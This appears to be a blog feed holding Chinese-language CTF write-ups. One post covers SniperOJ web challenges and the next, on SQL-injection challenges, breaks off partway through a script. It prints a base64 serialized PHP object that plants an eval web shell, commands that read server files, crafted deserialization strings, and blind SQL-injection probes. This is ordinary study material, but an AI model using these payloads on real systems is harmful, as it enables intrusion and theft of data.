    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00.前言"></a>0x00.前言</h2><p>今天机缘巧合发现了这个OJ平台，<a href="http://www.sniperoj.com/" target="_blank" rel="noopener">http://www.sniperoj.com/</a>, 就随手做一下，平台十分小清新，web题目还行，有一点收获，记录一下而已。</p><h2 id="0x01-记录"><a href="#0x01-记录" class="headerlink" title="0x01.记录"></a>0x01.记录</h2><h3 id="1-php-object-injection"><a href="#1-php-object-injection" class="headerlink" title="1.php-object-injection"></a>1.php-object-injection</h3><p>提示是一个反序列化题目，像这种什么都没给的，右键源码什么都木有的，不用说，一定是源码泄露了。swp，bak,~都给上去看看有木有。最后是 <a href="http://120.24.215.80:10007/.index.php.swp" target="_blank" rel="noopener">http://120.24.215.80:10007/.index.php.swp</a></p><p>在ubuntu中复原一下 vim -r index.php.swp 得:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span></span>&#123;</span><br><span class="line">     <span class="keyword">private</span> $logFile;</span><br><span class="line">     <span class="keyword">private</span> $initMsg;</span><br><span class="line">     <span class="keyword">private</span> $exitMsg;</span><br><span class="line"></span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span>&#123;</span><br><span class="line">         <span class="comment">// initialise variables</span></span><br><span class="line">         <span class="keyword">$this</span>-&gt;initMsg=<span class="string">"#--session started--#\n"</span>;</span><br><span class="line">         <span class="keyword">$this</span>-&gt;exitMsg=<span class="string">"#--session end--#\n"</span>;</span><br><span class="line">         <span class="keyword">$this</span>-&gt;logFile = <span class="string">"/tmp/natas26_"</span> . $file . <span class="string">".log"</span>;</span><br><span class="line"></span><br><span class="line">         <span class="comment">// write initial message</span></span><br><span class="line">         $fd=fopen(<span class="keyword">$this</span>-&gt;logFile,<span class="string">"a+"</span>);</span><br><span class="line">         fwrite($fd,$initMsg);</span><br><span class="line">         fclose($fd);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">log</span><span class="params">($msg)</span></span>&#123;</span><br><span class="line">         $fd=fopen(<span class="keyword">$this</span>-&gt;logFile,<span class="string">"a+"</span>);</span><br><span class="line">         fwrite($fd,$msg.<span class="string">"\n"</span>);</span><br><span class="line">         fclose($fd);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">         <span class="comment">// write exit message</span></span><br><span class="line">         $fd=fopen(<span class="keyword">$this</span>-&gt;logFile,<span class="string">"a+"</span>);</span><br><span class="line">         fwrite($fd,<span class="keyword">$this</span>-&gt;exitMsg);</span><br><span class="line">         fclose($fd);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><a id="more"></a><p>代码很长，给出上面两处就明白了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">    function storeData()&#123;</span><br><span class="line">        $new_object=array();</span><br><span class="line"></span><br><span class="line">        if(array_key_exists(&quot;x1&quot;, $_GET) &amp;&amp; array_key_exists(&quot;y1&quot;, $_GET) &amp;&amp;</span><br><span class="line">            array_key_exists(&quot;x2&quot;, $_GET) &amp;&amp; array_key_exists(&quot;y2&quot;, $_GET))&#123;</span><br><span class="line">            $new_object[&quot;x1&quot;]=$_GET[&quot;x1&quot;];</span><br><span class="line">            $new_object[&quot;y1&quot;]=$_GET[&quot;y1&quot;];</span><br><span class="line">            $new_object[&quot;x2&quot;]=$_GET[&quot;x2&quot;];</span><br><span class="line">            $new_object[&quot;y2&quot;]=$_GET[&quot;y2&quot;];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (array_key_exists(&quot;drawing&quot;, $_COOKIE))&#123;</span><br><span class="line">            $drawing=unserialize(base64_decode($_COOKIE[&quot;drawing&quot;]));</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            // create new array</span><br><span class="line">            $drawing=array();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $drawing[]=$new_object;</span><br><span class="line">        setcookie(&quot;drawing&quot;,base64_encode(serialize($drawing)));</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;content&quot;&gt;</span><br><span class="line"></span><br><span class="line">Draw a line:&lt;br&gt;</span><br><span class="line">&lt;form name=&quot;input&quot; method=&quot;get&quot;&gt;</span><br><span class="line">X1&lt;input type=&quot;text&quot; name=&quot;x1&quot; size=2&gt;</span><br><span class="line">Y1&lt;input type=&quot;text&quot; name=&quot;y1&quot; size=2&gt;</span><br><span class="line">X2&lt;input type=&quot;text&quot; name=&quot;x2&quot; size=2&gt;</span><br><span class="line">Y2&lt;input type=&quot;text&quot; name=&quot;y2&quot; size=2&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;DRAW!&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">    session_start();</span><br><span class="line"></span><br><span class="line">    if (array_key_exists(&quot;drawing&quot;, $_COOKIE) ||</span><br><span class="line">        (   array_key_exists(&quot;x1&quot;, $_GET) &amp;&amp; array_key_exists(&quot;y1&quot;, $_GET) &amp;&amp;</span><br><span class="line">            array_key_exists(&quot;x2&quot;, $_GET) &amp;&amp; array_key_exists(&quot;y2&quot;, $_GET)))&#123;</span><br><span class="line">        $imgfile=&quot;img/natas26_&quot; . session_id() .&quot;.png&quot;;</span><br><span class="line">        drawImage($imgfile);</span><br><span class="line">        showImage($imgfile);</span><br><span class="line">        storeData();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>_construct()是构造函数，在用对象前做一些微小得工作。这里可以直接反序列化创造文件。构造得:</p><p> <img src="http://myndtt.github.io/images/13.png" alt="13"></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tz<span class="meta">o2</span>OiJMb<span class="number">2</span>d<span class="symbol">nZXIiOjM6</span>e<span class="number">3</span><span class="name">M6</span>MTU<span class="number">6</span>IgBMb<span class="number">2</span>d<span class="symbol">nZXIAbG9</span><span class="symbol">nRmlsZSI7</span>czoxMjoiaW<span class="number">1</span><span class="symbol">nL215</span>bmQucGhwIjtzOjE<span class="number">1</span>OiIAT<span class="name">G9</span><span class="symbol">nZ2</span>VyAGluaXR<span class="symbol">Nc2</span>ci<span class="meta">O3</span><span class="name">M6</span>MDoiIjtzOjE<span class="number">1</span>OiIAT<span class="name">G9</span><span class="symbol">nZ2</span>VyAGV<span class="number">4</span>aXR<span class="symbol">Nc2</span>ci<span class="meta">O3</span><span class="name">M6</span>MjU<span class="number">6</span>Ijw<span class="meta">%</span><span class="number">2</span>FcGhwIGV<span class="number">2</span>YWwoJF<span class="number">9</span>QT<span class="number">1</span><span class="symbol">NUWydhJ10</span>pPz<span class="number">4</span>i<span class="meta">O30</span><span class="meta">%</span><span class="number">3</span>D</span><br></pre></td></tr></table></figure><p>burp抓包修改drawing为上述值</p><p><a href="http://120.24.215.80:10007/img/mynd.php" target="_blank" rel="noopener">http://120.24.215.80:10007/img/mynd.php</a>   依次post如下数据即可</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">a</span>=print_r(scandir(<span class="string">"../"</span>))<span class="comment">;</span></span><br><span class="line"><span class="attr">a</span>=print_r(file_get_contents(<span class="string">"../F_LLLLA_-gggg"</span>))<span class="comment">;</span></span><br></pre></td></tr></table></figure><h3 id="2-guess-the-code"><a href="#2-guess-the-code" class="headerlink" title="2.guess the code"></a>2.guess the code</h3><p>这道题跟上面是一个道理，都很简单，右键源码拉最后发现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;p hidden&gt;<span class="comment">#try to read flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">whatthefuck</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> highlight_file(<span class="keyword">$this</span>-&gt;source,<span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;&lt;/p&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>这个代码要我们取推测，很显然这个this-&gt;source变量source是关键，构造得:</p><p><img src="http://myndtt.github.io/images/14.png" alt="14"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">O</span>:11:<span class="string">"whatthefuck"</span>:1:&#123;s:6:<span class="string">"source"</span>;s:8:<span class="string">"flag.php"</span>;&#125;</span><br><span class="line"><span class="attribute">a</span><span class="number">%3</span>A1<span class="number">%3</span>A<span class="number">%7</span>Bi<span class="number">%3</span>A0<span class="number">%3</span>BO<span class="number">%3</span>A11<span class="number">%3</span>A<span class="number">%22</span>whatthefuck<span class="number">%22</span><span class="number">%3</span>A1<span class="number">%3</span>A<span class="number">%7</span>Bs<span class="number">%3</span>A6<span class="number">%3</span>A<span class="number">%22</span>source<span class="number">%22</span><span class="number">%3</span>Bs<span class="number">%3</span>A8<span class="number">%3</span>A<span class="number">%22</span>flag.php<span class="number">%22</span><span class="number">%3</span>B<span class="number">%7</span>D<span class="number">%7</span>D</span><br><span class="line"><span class="comment">#第一个是原始的</span></span><br></pre></td></tr></table></figure><p>最后问题来了，那要通过什么值取上传这个东西呢，Burp抓包看看就知道十有八九是这个list了。</p><h3 id="3-SniperOJ-Web-Browser"><a href="#3-SniperOJ-Web-Browser" class="headerlink" title="3.SniperOJ-Web-Browser"></a>3.SniperOJ-Web-Browser</h3><p>这个题比较有意思，开始以为会很水，最后那个要指定特定端口的还是很有意思，以前见过这类题writeup，用的好像是curl，重新翻了翻curl手册，看看有什么命令可以修改端口，果然，哈哈。只不过是要公网的</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--local-port 强制使用本地端口号</span></span><br></pre></td></tr></table></figure><p><img src="http://myndtt.github.io/images/15.png" alt="15"></p><h3 id="4-php-weak-type"><a href="#4-php-weak-type" class="headerlink" title="4.php-weak-type"></a>4.php-weak-type</h3><p><a href="http://120.24.215.80:10001/index.php" target="_blank" rel="noopener">http://120.24.215.80:10001/index.php</a>~  查看到源码，MD5,弱类型</p><p>其他题目暂时连不上</p><h2 id="0x02-学习"><a href="#0x02-学习" class="headerlink" title="0x02.学习"></a>0x02.学习</h2><h3 id="1-2048-GAME"><a href="#1-2048-GAME" class="headerlink" title="1.2048 GAME"></a>1.2048 GAME</h3><p>这道题算是最有意思的了，因为没做出来哈哈。</p><p>题目提示是git源码泄露，并且给了工具，但我以往用的工具不是给的这个。用的是这位大佬的</p><p><a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">https://github.com/lijiejie/GitHack</a></p><p>下下来源码以后，发现没什么用啊，都是JS,CSS，这些都可以右键源码跟进找到有什么用呢？</p><p>后来网上搜，翻看这个平台作者的简书<a href="http://www.jianshu.com/p/e9923b65789e" target="_blank" rel="noopener">http://www.jianshu.com/p/e9923b65789e</a></p><p>这让我不禁又会看起GIT教程了,还是廖大佬讲的清楚</p><p><a href="https://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000" target="_blank" rel="noopener">https://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000</a></p><p>其实就是当用题目给的那个工具还可以抓下.GIT，而flag就藏在以前的某个GIT版本里面，回退去就好了。</p><h2 id="0x03-学无止境"><a href="#0x03-学无止境" class="headerlink" title="0x03.学无止境"></a>0x03.学无止境</h2><p>最近发现了好几个平台，看见有意思的再写写吧</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00.前言&quot;&gt;&lt;/a&gt;0x00.前言&lt;/h2&gt;&lt;p&gt;今天机缘巧合发现了这个OJ平台，&lt;a href=&quot;http://www.sniperoj.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.sniperoj.com/&lt;/a&gt;, 就随手做一下，平台十分小清新，web题目还行，有一点收获，记录一下而已。&lt;/p&gt;
&lt;h2 id=&quot;0x01-记录&quot;&gt;&lt;a href=&quot;#0x01-记录&quot; class=&quot;headerlink&quot; title=&quot;0x01.记录&quot;&gt;&lt;/a&gt;0x01.记录&lt;/h2&gt;&lt;h3 id=&quot;1-php-object-injection&quot;&gt;&lt;a href=&quot;#1-php-object-injection&quot; class=&quot;headerlink&quot; title=&quot;1.php-object-injection&quot;&gt;&lt;/a&gt;1.php-object-injection&lt;/h3&gt;&lt;p&gt;提示是一个反序列化题目，像这种什么都没给的，右键源码什么都木有的，不用说，一定是源码泄露了。swp，bak,~都给上去看看有木有。最后是 &lt;a href=&quot;http://120.24.215.80:10007/.index.php.swp&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://120.24.215.80:10007/.index.php.swp&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在ubuntu中复原一下 vim -r index.php.swp 得:&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Logger&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;     &lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; $logFile;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;     &lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; $initMsg;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;     &lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; $exitMsg;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;     &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;__construct&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;($file)&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;comment&quot;&gt;// initialise variables&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;initMsg=&lt;span class=&quot;string&quot;&gt;&quot;#--session started--#\n&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;exitMsg=&lt;span class=&quot;string&quot;&gt;&quot;#--session end--#\n&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;logFile = &lt;span class=&quot;string&quot;&gt;&quot;/tmp/natas26_&quot;&lt;/span&gt; . $file . &lt;span class=&quot;string&quot;&gt;&quot;.log&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;comment&quot;&gt;// write initial message&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         $fd=fopen(&lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;logFile,&lt;span class=&quot;string&quot;&gt;&quot;a+&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         fwrite($fd,$initMsg);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         fclose($fd);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;     &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;     &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;($msg)&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         $fd=fopen(&lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;logFile,&lt;span class=&quot;string&quot;&gt;&quot;a+&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         fwrite($fd,$msg.&lt;span class=&quot;string&quot;&gt;&quot;\n&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         fclose($fd);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;     &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;     &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;__destruct&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         &lt;span class=&quot;comment&quot;&gt;// write exit message&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         $fd=fopen(&lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;logFile,&lt;span class=&quot;string&quot;&gt;&quot;a+&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         fwrite($fd,&lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;exitMsg);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         fclose($fd);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;     &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="记录" scheme="https://myndtt.github.io/tags/%E8%AE%B0%E5%BD%95/"/>
    
      <category term="web" scheme="https://myndtt.github.io/tags/web/"/>
    
      <category term="sniperoj" scheme="https://myndtt.github.io/tags/sniperoj/"/>
    
      <category term="ctf" scheme="https://myndtt.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>几道sql</title>
    <link href="https://myndtt.github.io/2017/10/26/%E5%87%A0%E9%81%93sqli/"/>
    <id>https://myndtt.github.io/2017/10/26/几道sqli/</id>
    <published>2017-10-26T08:21:53.000Z</published>
    <updated>2019-09-22T05:30:28.633Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00.前言"></a>0x00.前言</h2><p>今天在一个网站上做sql注入的题，有几道题，感觉挺有意思的。</p><p>一.题目链接: <a href="http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php" target="_blank" rel="noopener">http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php</a></p><p>代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>); </span><br><span class="line">  $query = <span class="string">"select id from prob_orc where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>; </span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query)); </span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello admin&lt;/h2&gt;"</span>; </span><br><span class="line">  $_GET[pw] = addslashes($_GET[pw]); </span><br><span class="line">  $query = <span class="string">"select pw from prob_orc where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>; </span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query)); </span><br><span class="line">  <span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"orc"</span>); </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这代码够简单的啦，还带回显的。看了看最后，估计是要我们盲注得到pw，这还不简单？写个脚本跑去来，得到pw长度，二分法去提取好了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pw=<span class="string">''</span> || length(pw)&gt;<span class="number">0</span></span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">pw=<span class="string">''</span> || ascii(substr(pw,<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">0</span></span><br><span class="line">.</span><br><span class="line">.</span><br></pre></td></tr></table></figure><p>对，确实如此，但是实际上我按上面那种方法怎么爆破都不对，甚至怀疑过我的代码，出轨了？</p><a id="more"></a><h2 id="0x01-渐悟"><a href="#0x01-渐悟" class="headerlink" title="0x01.渐悟"></a>0x01.渐悟</h2><p>想了一会，我才突然发现，我取错行了，这个表应该有好几行，但是我要的admin不在第一行。这就…</p><p>接下来目标就是如何取得我要的那一行，并且可以盲注的limit ,order by,desc等等，这里我就用了这一种方式</p><p><img src="https://myndtt.github.io/images/9.png" alt="9"></p><h2 id="0x02-解决"><a href="#0x02-解决" class="headerlink" title="0x02.解决"></a>0x02.解决</h2><p>但知道重点以后就是改一下代码了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> 